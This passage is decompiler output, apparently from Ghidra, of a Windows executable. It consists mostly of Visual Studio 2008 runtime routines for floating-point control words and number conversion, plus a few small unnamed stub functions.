    *(undefined *)(cVar15 + 4 + (int)param_6) = 0;
  }
  else {
    *param_6 = 0;
    *(undefined *)((int)param_6 + 3) = 1;
    *(byte *)(param_6 + 1) = ((uVar9 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)(param_6 + 2) = 0x30;
    *(undefined *)((int)param_6 + 5) = 0;
  }
LAB_0041b0d5:
  uStack_3e = iVar2;
  local_24 = uVar16;
  local_10 = param_2;
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __hw_cw
// 
// Library: Visual Studio 2008 Release

uint __hw_cw(void)

{
  uint uVar1;
  uint uVar2;
  uint unaff_EBX;
  
  uVar1 = (uint)((unaff_EBX & 0x10) != 0);
  if ((unaff_EBX & 8) != 0) {
    uVar1 = uVar1 | 4;
  }
  if ((unaff_EBX & 4) != 0) {
    uVar1 = uVar1 | 8;
  }
  if ((unaff_EBX & 2) != 0) {
    uVar1 = uVar1 | 0x10;
  }
  if ((unaff_EBX & 1) != 0) {
    uVar1 = uVar1 | 0x20;
  }
  if ((unaff_EBX & 0x80000) != 0) {
    uVar1 = uVar1 | 2;
  }
  uVar2 = unaff_EBX & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x400;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x800;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0xc00;
    }
  }
  if ((unaff_EBX & 0x30000) == 0) {
    uVar1 = uVar1 | 0x300;
  }
  else if ((unaff_EBX & 0x30000) == 0x10000) {
    uVar1 = uVar1 | 0x200;
  }
  if ((unaff_EBX & 0x40000) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___hw_cw_sse2
// 
// Library: Visual Studio 2008 Release

uint __fastcall ___hw_cw_sse2(undefined4 param_1,uint param_2)

{
  uint uVar1;
  uint uVar2;
  
  uVar1 = 0;
  if ((param_2 & 0x10) != 0) {
    uVar1 = 0x80;
  }
  if ((param_2 & 8) != 0) {
    uVar1 = uVar1 | 0x200;
  }
  if ((param_2 & 4) != 0) {
    uVar1 = uVar1 | 0x400;
  }
  if ((param_2 & 2) != 0) {
    uVar1 = uVar1 | 0x800;
  }
  if ((param_2 & 1) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  if ((param_2 & 0x80000) != 0) {
    uVar1 = uVar1 | 0x100;
  }
  uVar2 = param_2 & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x2000;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x4000;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0x6000;
    }
  }
  uVar2 = param_2 & 0x3000000;
  if (uVar2 == 0x1000000) {
    uVar1 = uVar1 | 0x8040;
  }
  else {
    if (uVar2 == 0x2000000) {
      return uVar1 | 0x40;
    }
    if (uVar2 == 0x3000000) {
      return uVar1 | 0x8000;
    }
  }
  return uVar1;
}



// Library Function - Single Match
//  __control87
// 
// Library: Visual Studio 2008 Release

uint __cdecl __control87(uint _NewValue,uint _Mask)

{
  ushort uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  ushort in_FPUControlWord;
  
  uVar5 = 0;
  if ((in_FPUControlWord & 1) != 0) {
    uVar5 = 0x10;
  }
  if ((in_FPUControlWord & 4) != 0) {
    uVar5 = uVar5 | 8;
  }
  if ((in_FPUControlWord & 8) != 0) {
    uVar5 = uVar5 | 4;
  }
  if ((in_FPUControlWord & 0x10) != 0) {
    uVar5 = uVar5 | 2;
  }
  if ((in_FPUControlWord & 0x20) != 0) {
    uVar5 = uVar5 | 1;
  }
  if ((in_FPUControlWord & 2) != 0) {
    uVar5 = uVar5 | 0x80000;
  }
  uVar1 = in_FPUControlWord & 0xc00;
  if ((in_FPUControlWord & 0xc00) != 0) {
    if (uVar1 == 0x400) {
      uVar5 = uVar5 | 0x100;
    }
    else if (uVar1 == 0x800) {
      uVar5 = uVar5 | 0x200;
    }
    else if (uVar1 == 0xc00) {
      uVar5 = uVar5 | 0x300;
    }
  }
  if ((in_FPUControlWord & 0x300) == 0) {
    uVar5 = uVar5 | 0x20000;
  }
  else if ((in_FPUControlWord & 0x300) == 0x200) {
    uVar5 = uVar5 | 0x10000;
  }
  if ((in_FPUControlWord & 0x1000) != 0) {
    uVar5 = uVar5 | 0x40000;
  }
  uVar2 = ~_Mask & uVar5 | _NewValue & _Mask;
  if (uVar2 != uVar5) {
    uVar5 = __hw_cw();
    uVar2 = 0;
    if ((uVar5 & 1) != 0) {
      uVar2 = 0x10;
    }
    if ((uVar5 & 4) != 0) {
      uVar2 = uVar2 | 8;
    }
    if ((uVar5 & 8) != 0) {
      uVar2 = uVar2 | 4;
    }
    if ((uVar5 & 0x10) != 0) {
      uVar2 = uVar2 | 2;
    }
    if ((uVar5 & 0x20) != 0) {
      uVar2 = uVar2 | 1;
    }
    if ((uVar5 & 2) != 0) {
      uVar2 = uVar2 | 0x80000;
    }
    uVar3 = uVar5 & 0xc00;
    if (uVar3 != 0) {
      if (uVar3 == 0x400) {
        uVar2 = uVar2 | 0x100;
      }
      else if (uVar3 == 0x800) {
        uVar2 = uVar2 | 0x200;
      }
      else if (uVar3 == 0xc00) {
        uVar2 = uVar2 | 0x300;
      }
    }
    if ((uVar5 & 0x300) == 0) {
      uVar2 = uVar2 | 0x20000;
    }
    else if ((uVar5 & 0x300) == 0x200) {
      uVar2 = uVar2 | 0x10000;
    }
    if ((uVar5 & 0x1000) != 0) {
      uVar2 = uVar2 | 0x40000;
    }
  }
  uVar5 = 0;
  if (DAT_004268c4 != 0) {
    if ((char)MXCSR < '\0') {
      uVar5 = 0x10;
    }
    if ((MXCSR & 0x200) != 0) {
      uVar5 = uVar5 | 8;
    }
    if ((MXCSR & 0x400) != 0) {
      uVar5 = uVar5 | 4;
    }
    if ((MXCSR & 0x800) != 0) {
      uVar5 = uVar5 | 2;
    }
    if ((MXCSR & 0x1000) != 0) {
      uVar5 = uVar5 | 1;
    }
    if ((MXCSR & 0x100) != 0) {
      uVar5 = uVar5 | 0x80000;
    }
    uVar3 = MXCSR & 0x6000;
    if (uVar3 != 0) {
      if (uVar3 == 0x2000) {
        uVar5 = uVar5 | 0x100;
      }
      else if (uVar3 == 0x4000) {
        uVar5 = uVar5 | 0x200;
      }
      else if (uVar3 == 0x6000) {
        uVar5 = uVar5 | 0x300;
      }
    }
    uVar4 = MXCSR & 0x8040;
    if (uVar4 == 0x40) {
      uVar5 = uVar5 | 0x2000000;
    }
    else if (uVar4 == 0x8000) {
      uVar5 = uVar5 | 0x3000000;
    }
    else if (uVar4 == 0x8040) {
      uVar5 = uVar5 | 0x1000000;
    }
    uVar4 = ~(_Mask & 0x308031f) & uVar5 | _Mask & 0x308031f & _NewValue;
    if (uVar4 != uVar5) {
      uVar5 = ___hw_cw_sse2(uVar3,uVar4);
      ___set_fpsr_sse2(uVar5);
      uVar5 = 0;
      if ((char)MXCSR < '\0') {
        uVar5 = 0x10;
      }
      if ((MXCSR & 0x200) != 0) {
        uVar5 = uVar5 | 8;
      }
      if ((MXCSR & 0x400) != 0) {
        uVar5 = uVar5 | 4;
      }
      if ((MXCSR & 0x800) != 0) {
        uVar5 = uVar5 | 2;
      }
      if ((MXCSR & 0x1000) != 0) {
        uVar5 = uVar5 | 1;
      }
      if ((MXCSR & 0x100) != 0) {
        uVar5 = uVar5 | 0x80000;
      }
      uVar3 = MXCSR & 0x6000;
      if (uVar3 != 0) {
        if (uVar3 == 0x2000) {
          uVar5 = uVar5 | 0x100;
        }
        else if (uVar3 == 0x4000) {
          uVar5 = uVar5 | 0x200;
        }
        else if (uVar3 == 0x6000) {
          uVar5 = uVar5 | 0x300;
        }
      }
      uVar3 = MXCSR & 0x8040;
      if (uVar3 == 0x40) {
        uVar5 = uVar5 | 0x2000000;
      }
      else if (uVar3 == 0x8000) {
        uVar5 = uVar5 | 0x3000000;
      }
      else if (uVar3 == 0x8040) {
        uVar5 = uVar5 | 0x1000000;
      }
    }
    uVar3 = uVar5 ^ uVar2;
    uVar2 = uVar5 | uVar2;
    if ((uVar3 & 0x8031f) != 0) {
      uVar2 = uVar2 | 0x80000000;
    }
  }
  return uVar2;
}



// Library Function - Single Match
//  ___mtold12
// 
// Library: Visual Studio 2008 Release

void __cdecl ___mtold12(char *param_1,int param_2,uint *param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  bool bVar4;
  bool bVar5;
  short sVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  
  uVar7 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  sVar6 = 0x404e;
  *param_3 = 0;
  param_3[1] = 0;
  param_3[2] = 0;
  if (param_2 != 0) {
    do {
      uVar2 = *param_3;
      uVar10 = *param_3;
      uVar1 = param_3[1];
      uVar11 = param_3[2];
      uVar9 = param_3[1] * 2;
      bVar4 = false;
      uVar8 = (param_3[2] * 2 | param_3[1] >> 0x1f) * 2 | uVar9 >> 0x1f;
      uVar3 = uVar2 * 4;
      uVar9 = (uVar9 | uVar2 >> 0x1f) * 2 | uVar2 * 2 >> 0x1f;
      uVar2 = uVar3 + uVar10;
      *param_3 = uVar3;
      param_3[1] = uVar9;
      param_3[2] = uVar8;
      if ((uVar2 < uVar3) || (uVar2 < uVar10)) {
        bVar4 = true;
      }
      bVar5 = false;
      *param_3 = uVar2;
      if (bVar4) {
        uVar10 = uVar9 + 1;
        if ((uVar10 < uVar9) || (uVar10 == 0)) {
          bVar5 = true;
        }
        param_3[1] = uVar10;
        if (bVar5) {
          param_3[2] = uVar8 + 1;
        }
      }
      uVar10 = param_3[1] + uVar1;
      bVar4 = false;
      if ((uVar10 < param_3[1]) || (uVar10 < uVar1)) {
        bVar4 = true;
      }
      param_3[1] = uVar10;
      if (bVar4) {
        param_3[2] = param_3[2] + 1;
      }
      param_3[2] = param_3[2] + uVar11;
      bVar4 = false;
      uVar1 = uVar2 * 2;
      uVar11 = uVar10 * 2 | uVar2 >> 0x1f;
      uVar10 = param_3[2] * 2 | uVar10 >> 0x1f;
      *param_3 = uVar1;
      param_3[1] = uVar11;
      param_3[2] = uVar10;
      uVar2 = uVar1 + (int)*param_1;
      if ((uVar2 < uVar1) || (uVar2 < (uint)(int)*param_1)) {
        bVar4 = true;
      }
      *param_3 = uVar2;
      if (bVar4) {
        uVar2 = uVar11 + 1;
        bVar4 = false;
        if ((uVar2 < uVar11) || (uVar2 == 0)) {
          bVar4 = true;
        }
        param_3[1] = uVar2;
        if (bVar4) {
          param_3[2] = uVar10 + 1;
        }
      }
      param_2 = param_2 + -1;
      param_1 = param_1 + 1;
    } while (param_2 != 0);
  }
  while (param_3[2] == 0) {
    param_3[2] = param_3[1] >> 0x10;
    sVar6 = sVar6 + -0x10;
    param_3[1] = param_3[1] << 0x10 | *param_3 >> 0x10;
    *param_3 = *param_3 << 0x10;
  }
  uVar2 = param_3[2];
  while ((uVar2 & 0x8000) == 0) {
    uVar10 = *param_3;
    uVar1 = param_3[1];
    sVar6 = sVar6 + -1;
    *param_3 = uVar10 * 2;
    uVar2 = param_3[2] * 2;
    param_3[1] = uVar1 * 2 | uVar10 >> 0x1f;
    param_3[2] = uVar2 | uVar1 >> 0x1f;
  }
  *(short *)((int)param_3 + 10) = sVar6;
  ___security_check_cookie_4(uVar7 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___set_fpsr_sse2
// 
// Library: Visual Studio 2008 Release

void __cdecl ___set_fpsr_sse2(uint param_1)

{
  if (DAT_004268c4 != 0) {
    if (((param_1 & 0x40) == 0) || (DAT_00423984 == 0)) {
      MXCSR = param_1 & 0xffffffbf;
    }
    else {
      MXCSR = param_1;
    }
  }
  return;
}



void Unwind_0041b79e(void)

{
  int unaff_EBP;
  
  FUN_0040b579(*(void **)(unaff_EBP + -0x10));
  return;
}



void FUN_00466458(void)

{
  return;
}



void FUN_00466462(void)

{
  uint extraout_ECX;
  byte bVar1;
  
  bVar1 = 0;
  do {
    FUN_00466458();
    bVar1 = CARRY4(extraout_ECX,extraout_ECX) || CARRY4(extraout_ECX * 2,(uint)bVar1);
    FUN_00466458();
  } while ((bool)bVar1);
  return;
}



void FUN_00466464(void)

{
  uint extraout_ECX;
  byte in_CF;
  
  do {
    FUN_00466458();
    in_CF = CARRY4(extraout_ECX,extraout_ECX) || CARRY4(extraout_ECX * 2,(uint)in_CF);
    FUN_00466458();
  } while ((bool)in_CF);
  return;
}


